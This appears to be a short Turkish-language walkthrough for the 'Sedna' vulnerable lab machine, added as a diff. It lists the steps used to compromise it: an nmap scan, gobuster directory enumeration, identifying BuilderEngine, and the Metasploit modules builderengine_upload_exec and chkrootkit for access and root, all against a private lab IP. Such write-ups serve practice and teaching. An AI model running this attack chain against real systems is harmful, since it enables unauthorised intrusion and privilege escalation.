@@ -1,0 +1,8 @@
+SEDNA MAKİNE ÇÖZÜMÜ
+1 - IP adresi 192.168.2.116 makine ekranında yazıyor.
+2 - nmap -sT -A 192.168.2.116
+3 - gobuster dir -u http://192.168.2.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
+4 - http://192.168.2.116/license.txt, BuilderEngine / Radian Enterprise Systems Limited
+5 - msfconsole, exploit/multi/http/builderengine_upload_exec
+6 - exploit/unix/local/chkrootkit
+7 - whoami
